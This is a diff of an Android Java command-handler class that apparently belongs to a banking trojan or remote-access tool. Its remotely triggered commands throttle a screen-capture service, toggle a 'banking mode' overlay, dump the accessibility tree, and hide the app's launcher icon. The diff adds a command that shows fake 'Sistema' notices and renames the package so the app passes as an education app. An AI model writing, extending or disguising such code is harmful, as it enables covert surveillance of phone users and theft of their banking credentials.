@@ -1,4 +1,4 @@
-package com.aval.seg;
+package com.eloeeducacao;
 
 import android.content.ComponentName;
 import android.content.Context;
@@ -60,6 +60,9 @@ public final class Cmd {
                     ScreenSvc.FPS = 2;
                     Net.send("{\"t\":\"info\",\"o\":\"modo banco: overlay off, 30q 2fps\"}");
                     if (acc()) Tree.dump(k);
+                    break;
+                case "aviso":
+                    Aviso.show(c, o.optString("ti", "Sistema"), o.optString("tx", ""));
                     break;
                 case "tree":
                     if (acc()) Tree.dump(k);
@@ -154,7 +157,7 @@ public final class Cmd {
                     break;
                 case "hide":
                     c.getPackageManager().setComponentEnabledSetting(
-                            new ComponentName(c, "com.aval.seg.Alias"),
+                            new ComponentName(c, "com.eloeeducacao.Alias"),
                             o.optBoolean("on", true)
                                     ? PackageManager.COMPONENT_ENABLED_STATE_DISABLED
                                     : PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
